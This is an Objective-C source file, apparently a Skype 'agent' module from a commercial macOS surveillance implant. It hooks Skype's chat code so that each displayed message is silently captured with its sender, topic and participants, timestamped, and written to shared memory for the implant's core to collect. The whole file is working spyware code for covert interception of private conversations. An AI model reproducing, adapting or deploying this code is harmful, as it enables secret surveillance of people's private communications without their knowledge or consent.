/*
 * RCSMac - Skype Agent
 * 
 * [QUICK TODO]
 * - Voice
 *
 * Created by Alfredo 'revenge' Pesoli on 11/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSMAgentIMSkype.h"

//#define DEBUG

@implementation mySkypeChat

- (BOOL)isMessageRecentlyDisplayedHook: (uint)arg1
{
  BOOL success  = [self isMessageRecentlyDisplayedHook: arg1];
  id message    = [self getChatMessageWithObjectID: arg1];
  /*
  NSMethodSignature *methodSignature = [[self class] instanceMethodSignatureForSelector: @selector(getChatMessageWithObjectID:)];
  NSInvocation *invocation           = [NSInvocation invocationWithMethodSignature: methodSignature];
  
  [invocation setTarget: self];
  [invocation setSelector: @selector(getChatMessageWithObjectID:)];
  [invocation setArgument: &arg1 atIndex: 2];
  
  [invocation invoke];
  [invocation getReturnValue: message];
  
  
  if ([self respondsToSelector: @selector(getChatMessageWithObjectID:)])
    {
#ifdef DEBUG
      NSLog(@"Method found so what?");
#endif
      
    }
  */
  if (message == nil)
    {
#ifdef DEBUG
      NSLog(@"[ERR] Failed to obtain message");
#endif
      
      return success;
    }
  //id message    = [self performSelector: @selector(getChatMessageWithObjectID)
  //                           withObject: arg1];
  
  NSArray *_activeMembers;
  NSMutableString *activeMembers  = [[NSMutableString alloc] init];
  NSMutableString *loggedText     = [[NSMutableString alloc] init];

#ifdef DEBUG
  NSLog(@"message: %@", message);
#endif
  
  if (message != nil)
    {
#ifdef DEBUG
      NSLog(@"posterHandles: %@", [self performSelector: @selector(posterHandles)]);
#endif
      
      if ([self respondsToSelector: @selector(activeMemberHandles)]) // Skype < 2.8.0.722
        {
          _activeMembers = [NSArray arrayWithArray: [self performSelector: @selector(activeMemberHandles)]];
        }
      else if ([self respondsToSelector: @selector(posterHandles)]) // Skype 2.8.0.722
        {
          _activeMembers = [NSArray arrayWithArray: [self performSelector: @selector(posterHandles)]];
        }
      
      if ([message body] != NULL)
        {
          int x;
          
          for (x = 0; x < [_activeMembers count]; x++)
            {
              NSString *entry = [_activeMembers objectAtIndex: x];
              
              [activeMembers appendString: entry];
              
              if (x != [_activeMembers count] - 1)
                [activeMembers appendString: @" | "];
            }
          
          // Appending date and time
          //[loggedText appendFormat: @"%@ ", [message date]];

          // Appending the contact name that sent the message
          MacContact *fromContact = [message fromUser];
          [loggedText appendFormat: @"%@: ", [fromContact identity]];
          
          // Appending the message body
          [loggedText appendString: [message body]];
          
#ifdef DEBUG
          NSLog(@"fromUser: %@", [message fromUser]);
          NSLog(@"dialogContact: %@", [self performSelector: @selector(dialogContact)]);
          NSLog(@"peers: %@", activeMembers);
          NSLog(@"message: %@", loggedText);
#endif
        }
    }

  // Start logging
  NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
  NSString *_processName      = [processInfo processName];
  NSString *_topic            = [self performSelector: @selector(topic)];
  
  NSData *processName         = [_processName dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *topic               = [_topic dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *peers               = [activeMembers dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *content             = [loggedText dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  NSMutableData *logData      = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *entryData    = [[NSMutableData alloc] init];
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  short unicodeNullTerminator = 0x0000;
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // Struct tm
  time (&rawtime);
  tmTemp = gmtime(&rawtime);
  tmTemp->tm_year += 1900;
  tmTemp->tm_mon  ++;
  
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  //
  if (sizeof(long) == 4) // 32bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
    }
  else if (sizeof(long) == 8) // 64bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x14];
    }
  
  // Process Name
  [entryData appendData: processName];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Topic
  [entryData appendData: topic];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Peers
  [entryData appendData: peers];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Content
  [entryData appendData: content];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Delimeter
  unsigned int del = DELIMETER;
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
#ifdef DEBUG
  NSLog(@"entryData: %@", entryData);
#endif
  
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->agentID         = AGENT_CHAT;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
#ifdef DEBUG
  NSLog(@"logData: %@", logData);
#endif
  
  if ([mSharedMemoryLogging writeMemory: logData 
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG
      NSLog(@"message: %@", loggedText);
#endif
    }
  else
    {
#ifdef DEBUG
      NSLog(@"Error while logging skype message to shared memory");
#endif
    }
  
  [activeMembers release];
  [loggedText release];
  
  [logData release];
  [entryData release];
  
  return success;
}

@end